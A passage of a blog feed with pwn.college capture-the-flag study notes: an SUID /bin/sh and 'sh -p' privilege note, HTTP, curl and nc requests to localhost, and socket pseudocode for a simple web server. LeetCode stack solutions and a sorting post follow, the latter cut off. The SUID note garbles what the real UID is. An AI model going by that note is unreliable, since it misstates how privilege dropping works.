class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">## Program Misuse:Mitigations</span><br><span class="line"></span><br><span class="line">**command injection**</span><br><span class="line"></span><br><span class="line">**/bin/sh** SUID mitigation：</span><br><span class="line"></span><br><span class="line">if `/bin/sh` is run as SUID (eUID==0 but rUID !=0)</span><br><span class="line"></span><br><span class="line">it will drop privileges to the rUID(root UID) (eUID=rUID and rUID !=0)</span><br><span class="line"></span><br><span class="line">Mitigation: to disable `sh -p`</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># module2(Talking Web)</span><br><span class="line"></span><br><span class="line">static http request:</span><br><span class="line"></span><br><span class="line">- `GET /cat.gif HTTP/1.0`—&gt;</span><br><span class="line">- `HTTP/1.0 200 OK` &lt;—</span><br><span class="line"></span><br><span class="line">dynamic http request:</span><br><span class="line"></span><br><span class="line">- `GET /time?tz=UTC HTTP/1.0` —&gt;</span><br><span class="line"></span><br><span class="line">- ```</span><br><span class="line">  HTTP/1.0 200 OK</span><br><span class="line">  Content-Type: text/plain</span><br><span class="line">  Content-Length: 19</span><br><span class="line">  </span><br><span class="line">  2022-01-19 03:14:07 //&lt;——</span><br></pre></td></tr></table></figure><h2 id="Talking-Web-The-Internet"><a href="#Talking-Web-The-Internet" class="headerlink" title="Talking Web: The Internet"></a>Talking Web: The Internet</h2><p>TCP&#x2F;IP</p><ul><li>Link Layer(Physically link computers)</li><li>Internet Layer(Find the right computer:IP、ICMP、ARP)</li><li>Transport Layer(Find the right program:UDP、TCP)</li><li>Application Layer(Talk with the program:HTTP、FTP、SMTP、SSH)</li></ul><h2 id="Talking-Web-RFC-1945"><a href="#Talking-Web-RFC-1945" class="headerlink" title="Talking Web: RFC 1945"></a>Talking Web: RFC 1945</h2><p>①Hyper Transfer Protocol: HTTP is an application-level protocol</p><p>②Request-Line &#x3D; Method SP Request-URI SP HTTP-Version CRLF</p><p>SP: space, CRLF: \n</p><ul><li>Method: “GET” | “HEAD” | “POST”</li></ul><p>③Status-Line &#x3D; HTTP-Version SP Status-Code SP Reason-Phrase CRLF</p><p><strong>Status-Code Definition</strong></p><p>1xx: <strong>Informational</strong>-Not used, but reserved for futrue use</p><p>2xx: <strong>Success</strong>-The action was successfully received, understood, and accepted</p><p>3xx: <strong>Redirection</strong>-Further action must be taken in order to complete the request</p><p>4xx: <strong>Client Error</strong>-The request contains bad syntax or can’t be fulfilled</p><p>5xx: <strong>Server Error</strong>-The server failed to fulfill an apparently valid request</p><p>④ GET</p><blockquote><p><code>GET请求</code></p><p>GET &#x2F;greet HTTP&#x2F;1.0</p><p>Host: hello.example.com</p></blockquote><blockquote><p><code>服务器返回</code></p><p>HTTP&#x2F;1.0 200 OK</p><p>Content-Type: text&#x2F;html; charset&#x3D;UTF-8</p><p>Content-Length: 39</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;&lt;body&gt;Hello, World!&lt;/body&gt;&lt;/html&gt;</span><br></pre></td></tr></table></figure></blockquote><p>⑥ POST</p><blockquote><p><code>POST请求</code></p><p>POST &#x2F;greet HTTP&#x2F;1.0</p><p>Host: hello.example.com</p><p>Content-Length: 11</p><p>Content-Type: application&#x2F;x-www-form-urlencoded</p><p>name&#x3D;Connor</p></blockquote><blockquote><p><code>返回</code></p><p>HTTP&#x2F;1.0 200 OK</p><p>Content-Length: 0</p></blockquote><h2 id="Talking-Web-URLs-and-Encoding"><a href="#Talking-Web-URLs-and-Encoding" class="headerlink" title="Talking Web: URLs and Encoding"></a>Talking Web: URLs and Encoding</h2><p>① URL: <code>&lt;scheme&gt;://&lt;host&gt;:&lt;port&gt;/&lt;path&gt;?&lt;query&gt;#&lt;fragment&gt;</code></p><p>scheme: Protocol used to access resource</p><p>host: Host that holds resource</p><p>port: Port for program servicing resource</p><p>path: Identifies the specific resource</p><p>query: Information that the resource can use</p><p>fragment: Client information about the resource</p><p>②URL encoding</p><p>SP&#x3D;%20 #&#x3D;%23 &#x2F;&#x3D;%2F ?&#x3D;%3F A&#x3D;%41</p><p>③ Content-Type: Form</p><p>application&#x2F;x-www-form-urlencoded name&#x3D;xx</p><p>application&#x2F;json {“name”:”xx”}</p><h2 id="Talking-Web-State"><a href="#Talking-Web-State" class="headerlink" title="Talking Web: State"></a>Talking Web: State</h2><p>① HTTP is a stateless protocol</p><p><strong>solution:</strong> use HTTP Headers for maintaning state</p><ol><li>The server sets a cookie in a response with the header: <code>Set-Cookie</code></li><li>The client includes the cookie in future requests with the header: <code>Cookie</code></li></ol><h2 id="CURL"><a href="#CURL" class="headerlink" title="CURL"></a>CURL</h2><p>CURL（CommandLine Uniform Resource Locator），是一个利用 URL 语法，在命令行终端下使用的网络请求工具，支持 HTTP、HTTPS、FTP 等协议。</p><h3 id="1-1-基础语法"><a href="#1-1-基础语法" class="headerlink" title="1.1 基础语法"></a>1.1 基础语法</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl [options...] &lt;url&gt;</span><br></pre></td></tr></table></figure><h3 id="1-2-常用参数"><a href="#1-2-常用参数" class="headerlink" title="1.2 常用参数"></a>1.2 常用参数</h3><p>(1)Show Info</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">-v/--verbose                    # output details</span><br><span class="line">-H &#x27;Host:xxx&#x27;:       # 自定义 HTTP 头部, Host 头部通常用于指定要访问的主机名</span><br><span class="line">-d &quot;a=xxx&quot;#-d:--data <span class="language-xml"><span class="tag">&lt;<span class="name">data</span>&gt;</span></span>   HTTP POST data</span><br><span class="line">-XPOST/GET# 是指定什么类型(POST/GET/HEAD/DELETE/PUT/PATCH)</span><br><span class="line">-L#--location(HTTP/HTTPS)追随http响应头“Location：”定向到跳转后的页面；(在http响应码为3XX时使用，如301跳转、302跳转)</span><br><span class="line"></span><br><span class="line">curl 127.0.0.1:80 -H &#x27;Host:xxx&#x27; </span><br></pre></td></tr></table></figure><h3 id="传参数"><a href="#传参数" class="headerlink" title="传参数"></a>传参数</h3><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">单个：</span><br><span class="line">curl -v 127.0.0.1:80?a=xxx</span><br><span class="line">curl -v 127.0.0.1:80/?a=xxx</span><br><span class="line"></span><br><span class="line">多个：</span><br><span class="line">curl -v 127.0.0.1:80?a=xxx&amp;b=xxx  #same as&#x27;curl -v 127.0.0.1:80?a=xxx#need to transfer meaning</span><br><span class="line">curl -v 127.0.0.1:80?a=xxx\&amp;b=xxx#get flag</span><br></pre></td></tr></table></figure><p><strong>特殊字符encoder</strong></p><table><thead><tr><th>tab</th><th>%9</th></tr></thead><tbody><tr><td>#</td><td>%23</td></tr><tr><td>“</td><td>%22</td></tr><tr><td>space</td><td>%20</td></tr><tr><td>!</td><td>%21</td></tr><tr><td>&amp;</td><td>%26</td></tr></tbody></table><p>etc.</p><h2 id="nc命令"><a href="#nc命令" class="headerlink" title="nc命令"></a>nc命令</h2><p>nc是netcat的简写，有着网络界的瑞士军刀美誉。因为它短小精悍、功能实用，被设计为一个简单、可靠的网络工具。比如大家很熟悉使用telnet测试tcp端口，而nc可以支持测试linux的tcp和udp端口，而且也经常被用于端口扫描，甚至把nc作为server以TCP或UDP方式侦听指定端口做简单的模拟测试。</p><p>Used to send and to monitor any TCP and UDP data, so we can simulate any client or server</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">$ nc 127.0.0.1 80</span><br><span class="line">#Simulate the HTTP request</span><br><span class="line">==============================================</span><br><span class="line">GET / HTTP/1.1#input</span><br><span class="line">host: localhost#127.0.0.1 either</span><br><span class="line"></span><br><span class="line">==============================================</span><br><span class="line">POST / HTTP/1.1</span><br><span class="line">Content-Length: 74</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line">a=xxx&amp;b=xxx</span><br><span class="line">================================================</span><br><span class="line">POST / HTTP/1.1</span><br><span class="line">Content-Length: 123</span><br><span class="line">Content-Type: application/json</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">&quot;a&quot;:&quot;xx&quot;,</span><br><span class="line">&quot;b&quot;:&#123;&quot;c&quot;: &quot;xxx&quot;, &quot;d&quot;: [&quot;xx&quot;, &quot;x xx&amp;xxx#xxxx&quot;]&#125;</span><br><span class="line">&#125;</span><br><span class="line">================================================</span><br></pre></td></tr></table></figure><h3 id="传参数-1"><a href="#传参数-1" class="headerlink" title="传参数"></a>传参数</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">单个：</span><br><span class="line">GET /?a=xxx HTTP/1.1 </span><br><span class="line"></span><br><span class="line">多个：</span><br><span class="line">GET /?a=xxx&amp;b=xxx HTTP/1.1 </span><br></pre></td></tr></table></figure><h1 id="module4-Building-a-Web-Server"><a href="#module4-Building-a-Web-Server" class="headerlink" title="module4(Building a Web Server)"></a>module4(Building a Web Server)</h1><h2 id="Building-a-Web-Server-Linux-Processes"><a href="#Building-a-Web-Server-Linux-Processes" class="headerlink" title="Building a Web Server: Linux Processes"></a>Building a Web Server: Linux Processes</h2><p><code>Linux的系统函数</code></p><p>①syscall</p><p><strong>read(int fd, void <code>\*</code>buf, size_t count)</strong> attempts to read up to count bytes from file descriptor fd into the buffer starting at buf.</p><p><strong>write(int fd, void <code>\*</code>buf, size_t count)</strong> writes up to count bytes from the buffer starting at buf to the file referred to by the file descriptor fd.</p><p><strong>open(char <code>\*</code>pathname, int flags, mode_t mode)</strong> opens the file specified by pathname. If the specified file doesn’t exist, it may optionally be created(if O_CREAT is specified in flags), the return value of it is a file descriptor that used in subsequent system calls(read(2),write(2),lseek(2),fcntl(2)) to refer to the open file.</p><p>②system calls</p><p>for more system call can see <a href="https://x64.syscall.sh/">this</a></p><h2 id="Building-a-Web-Server-Network-System-Calls"><a href="#Building-a-Web-Server-Network-System-Calls" class="headerlink" title="Building a Web Server: Network System Calls"></a>Building a Web Server: Network System Calls</h2><ol><li><p><img src="/2024/01/17/pwn-college/image-20240117224839466.png" alt="image-20240117224839466"></p></li><li><pre><code>struct sockaddr&#123;    uint16_t sa_family;// 2字节    uint8_t sa_data[14];// 1字节 x 14端口+IP&#125;;struct sockaddr_in&#123;    uint16_t sin_family;//2字节    uint16_t sin_port;//端口    uint32_t sin_addr;//IP    uint8_t __pad[8];//空&#125;<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">3. </span><br><span class="line"></span><br><span class="line">AF_INET is 2; [htons()](https://stackoverflow.com/questions/19207745/htons-function-in-socket-programing)function used to convert the number from little endian to big endian for networking work on big ending integers; `ipv4` address of 4 bytes is also big endian, the[inet_addr()](https://blog.csdn.net/ivnetware/article/details/78756321)function cverts an unsigned integer IP from a host end-order to a network end-order</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">`.ascii`, `.asciz`区别：`.asciz`会在末尾自动添加`\0`</span><br><span class="line"></span><br><span class="line">## 学习笔记</span><br><span class="line"></span><br><span class="line">使用socket创建一个A-B的网络文件，然后使用bind将socket与具体的ip绑定。使用listen来被动侦听sockfd。使用accept接受外部连接。</span><br><span class="line"></span><br><span class="line">使用TCP/IP进行网络通讯，服务器端的例子如：</span><br><span class="line"></span><br><span class="line">```cpp</span><br><span class="line">// int socket(int domain, int type, int protocol)</span><br><span class="line">socket_fd = socket(AF_INET, SOCK_STREAM, IPPROTO_IP);</span><br><span class="line">    </span><br><span class="line">// int bind(int socket_fd, struct sockaddr* addr, socklen_t addrlen)</span><br><span class="line">/*</span><br><span class="line"> * struct sockaddr &#123;</span><br><span class="line"> *   uint16_t sa_family;</span><br><span class="line"> *   uint8_t  sa_data[14];   port + ip</span><br><span class="line"> * &#125;</span><br><span class="line"> * </span><br><span class="line"> * struct sockaddr_in &#123;</span><br><span class="line"> *   uint16_t sin_family;</span><br><span class="line"> *   uint16_t sin_port;port</span><br><span class="line"> *   uint32_t sin_addr;ip</span><br><span class="line"> *   uint8_t  __pad[8];not use</span><br><span class="line"> * &#125;</span><br><span class="line">*/</span><br><span class="line">    </span><br><span class="line">bind(socket_fd, &#123;sa_family=AF_INET, sin_port=htons(port), sin_addr=inet_addr(&quot;0.0.0.0&quot;)&#125;, 16);</span><br><span class="line"></span><br><span class="line">// int listen(int socket_fd, int backlog);</span><br><span class="line">listen(socket_fd, 0);</span><br><span class="line"></span><br><span class="line">while(1)</span><br><span class="line">&#123;</span><br><span class="line">    // int accept(int socket_fd, struct sockaddr* addr, socklen_t* addrlen);</span><br><span class="line">    tunnel = accept(socket_fd, NULL, NULL);</span><br><span class="line"></span><br><span class="line">    // receive http request: GET /file/xxx HTTP/1.0</span><br><span class="line">    // ssize_t read(int fd, void buf[.count], size_t count); read msg from client into [request]</span><br><span class="line">    // eg: GET /flag HTTP/1.0\r\n\r\n</span><br><span class="line">    read(tunnel, request, maxLength); // then extract the file path</span><br><span class="line"></span><br><span class="line">    if(request == GET)</span><br><span class="line">    &#123;</span><br><span class="line">        // open file and read file</span><br><span class="line">        file_fd = open(file_path, mode); // O_RDONLY, O_CREAT, O_WRONLY</span><br><span class="line">        valid_count = read(file_fd, file_content, maxLength); // read file content into file_content</span><br><span class="line">        // response</span><br><span class="line">        write(tunnel, &quot;HTTP/1.0 200 OK\r\n\r\n&quot;, 19);</span><br><span class="line">        write(tunnel, file_content, valid_count);</span><br><span class="line">        close(file_fd);</span><br><span class="line">    &#125;</span><br><span class="line">    else if(request == POST)</span><br><span class="line">    &#123;</span><br><span class="line">        file_fd = open(file_path, mode); // O_WRONLY...</span><br><span class="line">        write(file_fd, POST_request_body, POST_request_body_length);</span><br><span class="line">        close(file_fd);</span><br><span class="line">        // response</span><br><span class="line">        write(tunnel, &quot;HTTP/1.0 200 OK\r\n\r\n&quot;, 19);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    close(tunnel);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">exit(0);</span><br></pre></td></tr></table></figure></code></pre></li></ol><h1 id="module5-Reverse-Engineering"><a href="#module5-Reverse-Engineering" class="headerlink" title="module5(Reverse Engineering)"></a>module5(Reverse Engineering)</h1><h2 id="学习笔记"><a href="#学习笔记" class="headerlink" title="学习笔记"></a>学习笔记</h2><p>Linux file命令用于辨识文件类型。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file [-bcLvz][-f &lt;名称文件&gt;][-m &lt;魔法数字文件&gt;...][文件或目录...]</span><br></pre></td></tr></table></figure><p><strong>参数</strong>：</p><ul><li>-b 　列出辨识结果时，不显示文件名称。</li><li>-c 　详细显示指令执行过程，便于排错或分析程序执行的情形。</li><li>-f&lt;名称文件&gt; 　指定名称文件，其内容有一个或多个文件名称时，让file依序辨识这些文件，格式为每列一个文件名称。</li><li>-L 　直接显示符号连接所指向的文件的类别。</li><li>-m&lt;魔法数字文件&gt; 　指定魔法数字文件。</li><li>-v 　显示版本信息。</li><li>-z 　尝试去解读压缩文件的内容。</li><li>[文件或目录…] 要确定类型的文件列表，多个文件之间使用空格分开，可以使用shell通配符匹配多个文件。</li></ul><p><img src="/2024/01/17/pwn-college/image-20240121164931795.png" alt="image-20240121164931795"></p><p>Linux strings命令</p><p>strings - print the strings of printable characters in files.</p><p>意思是， 打印文件中可打印的字符。 我来补充一下吧， 这个文件可以是文本文件（test.c）, 可执行文件(test), 动态链接库(test.o), 静态链接库(test.a)</p><p>Linux strip命令</p><p><strong>简单的说就是给文件脱掉外衣，具体就是从特定文件中剥掉一些符号信息和调试信息，使文件变小。</strong></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;a href=&quot;https://tech.c01dkit.com/pwn-college-cse365-spring2023/#building-a-web-server&quot;&gt;https://tech.c01dkit.com/pwn-college-cse365-sprin</summary>
      
    
    
    
    <category term="pwn_college" scheme="https://1xueyu1.github.io/categories/pwn-college/"/>
    
    
  </entry>
  
  <entry>
    <title>单调栈</title>
    <link href="https://1xueyu1.github.io/2023/12/21/%E5%8D%95%E8%B0%83%E6%A0%88/"/>
    <id>https://1xueyu1.github.io/2023/12/21/%E5%8D%95%E8%B0%83%E6%A0%88/</id>
    <published>2023-12-21T10:19:00.000Z</published>
    <updated>2023-12-21T10:24:18.545Z</updated>
    
    <content type="html"><![CDATA[<h2 id="单调栈"><a href="#单调栈" class="headerlink" title="单调栈"></a>单调栈</h2><p><a href="https://leetcode.cn/problems/trapping-rain-water/description/">42. 接雨水 - 力扣（LeetCode）</a></p><p>单调栈一般用于存放数组的<strong>下标</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">trap</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; height)</span> </span>&#123;</span><br><span class="line">        <span class="comment">// 单调栈，用于存放下标</span></span><br><span class="line">        stack&lt;<span class="type">int</span>&gt; st;</span><br><span class="line">        <span class="type">int</span> ans = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; height.<span class="built_in">size</span>(); i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">while</span>(!st.<span class="built_in">empty</span>() &amp;&amp; height[i] &gt;= height[st.<span class="built_in">top</span>()])</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="comment">// 求中间的高度</span></span><br><span class="line">                <span class="type">int</span> bottom_h = height[st.<span class="built_in">top</span>()];</span><br><span class="line">                st.<span class="built_in">pop</span>();</span><br><span class="line">                <span class="comment">// 如果到边缘结束</span></span><br><span class="line">                <span class="keyword">if</span>(st.<span class="built_in">empty</span>())<span class="keyword">break</span>;</span><br><span class="line">                <span class="comment">// 待求面积的高，两边高度较小的减去中间的</span></span><br><span class="line">                <span class="type">int</span> dh = <span class="built_in">min</span>(height[i], height[st.<span class="built_in">top</span>()]) - bottom_h;</span><br><span class="line">                <span class="comment">// 乘上宽度即是面积</span></span><br><span class="line">                ans += dh * (i - st.<span class="built_in">top</span>() - <span class="number">1</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            st.<span class="built_in">push</span>(i);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="前后缀和-单调栈"><a href="#前后缀和-单调栈" class="headerlink" title="前后缀和+单调栈"></a>前后缀和+单调栈</h2><p><a href="https://leetcode.cn/problems/beautiful-towers-ii/description/?envType=daily-question&envId=2023-12-21">2866. 美丽塔 II - 力扣（LeetCode）</a></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">long</span> <span class="type">long</span> <span class="title">maximumSumOfHeights</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; maxHeights)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> n = maxHeights.<span class="built_in">size</span>();</span><br><span class="line">        stack&lt;<span class="type">int</span>&gt; st;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 后缀和</span></span><br><span class="line">        <span class="function">vector&lt;<span class="type">long</span> <span class="type">long</span>&gt; <span class="title">suf</span><span class="params">(n + <span class="number">1</span>)</span></span>;</span><br><span class="line">        <span class="type">long</span> <span class="type">long</span> sum = <span class="number">0</span>;</span><br><span class="line">        <span class="comment">// 哨兵</span></span><br><span class="line">        st.<span class="built_in">push</span>(n);</span><br><span class="line">        <span class="comment">// 求后缀和</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = n - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i--) &#123;</span><br><span class="line">            <span class="type">int</span> x = maxHeights[i];</span><br><span class="line">            <span class="comment">// x &lt;= maxHeights[st.top()] 等于代表相邻相同的数值存一次</span></span><br><span class="line">            <span class="keyword">while</span> (st.<span class="built_in">size</span>() &gt; <span class="number">1</span> &amp;&amp; x &lt;= maxHeights[st.<span class="built_in">top</span>()]) &#123;</span><br><span class="line">                <span class="type">int</span> j = st.<span class="built_in">top</span>();</span><br><span class="line">                st.<span class="built_in">pop</span>();</span><br><span class="line">                sum -= (<span class="type">long</span> <span class="type">long</span>)maxHeights[j] * (st.<span class="built_in">top</span>() - j);</span><br><span class="line">            &#125;</span><br><span class="line">            sum += (<span class="type">long</span> <span class="type">long</span>)maxHeights[i] * (st.<span class="built_in">top</span>() - i);</span><br><span class="line">            suf[i] = sum;</span><br><span class="line">            st.<span class="built_in">push</span>(i);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        st = <span class="built_in">stack</span>&lt;<span class="type">int</span>&gt;();</span><br><span class="line">        <span class="type">long</span> <span class="type">long</span> ans = sum;</span><br><span class="line">        <span class="type">long</span> <span class="type">long</span> pre = <span class="number">0</span>;</span><br><span class="line">        st.<span class="built_in">push</span>(<span class="number">-1</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">            <span class="type">int</span> x = maxHeights[i];</span><br><span class="line">            <span class="keyword">while</span> (st.<span class="built_in">size</span>() &gt; <span class="number">1</span> &amp;&amp; x &lt;= maxHeights[st.<span class="built_in">top</span>()]) &#123;</span><br><span class="line">                <span class="type">int</span> j = st.<span class="built_in">top</span>();</span><br><span class="line">                st.<span class="built_in">pop</span>();</span><br><span class="line">                pre -= (<span class="type">long</span> <span class="type">long</span>)maxHeights[j] * (j - st.<span class="built_in">top</span>());</span><br><span class="line">            &#125;</span><br><span class="line">            pre += (<span class="type">long</span> <span class="type">long</span>)maxHeights[i] * (i - st.<span class="built_in">top</span>());</span><br><span class="line">            ans = <span class="built_in">max</span>(ans, pre + suf[i + <span class="number">1</span>]);</span><br><span class="line">            st.<span class="built_in">push</span>(i);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;单调栈&quot;&gt;&lt;a href=&quot;#单调栈&quot; class=&quot;headerlink&quot; title=&quot;单调栈&quot;&gt;&lt;/a&gt;单调栈&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://leetcode.cn/problems/trapping-rain-water/descript</summary>
      
    
    
    
    <category term="数据结构" scheme="https://1xueyu1.github.io/categories/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"/>
    
    <category term="skill" scheme="https://1xueyu1.github.io/categories/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/skill/"/>
    
    
    <category term="单调栈" scheme="https://1xueyu1.github.io/tags/%E5%8D%95%E8%B0%83%E6%A0%88/"/>
    
  </entry>
  
  <entry>
    <title>排序</title>
    <link href="https://1xueyu1.github.io/2023/12/20/%E6%8E%92%E5%BA%8F/"/>
    <id>https://1xueyu1.github.io/2023/12/20/%E6%8E%92%E5%BA%8F/</id>
    <published>2023-12-20T03:41:56.000Z</published>
    <updated>2023-12-23T12:54:58.193Z</updated>
    
    <content type="html"><![CDATA[<h1 id="排序算法"><a href="#排序算法" class="headerlink" title="排序算法"></a>排序算法</h1><h2 id="插入排序"><a href="#插入排序" class="headerlink" title="插入排序"></a>插入排序</h2><h3 id="插入排序-1"><a href="#插入排序-1" class="headerlink" title="插入排序"></a>插入排序</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 插入排序</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">insertSort</span><span class="params">(<span class="type">int</span> nums[], <span class="type">int</span> n)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="type">int</span> i, j;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">1</span>; i &lt; n; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> temp = nums[i];</span><br><span class="line"><span class="keyword">for</span> (j = i - <span class="number">1</span>; j &gt;= <span class="number">0</span> &amp;&amp; nums[j] &gt; temp; j--)</span><br><span class="line">&#123;</span><br><span class="line">nums[j + <span class="number">1</span>] = 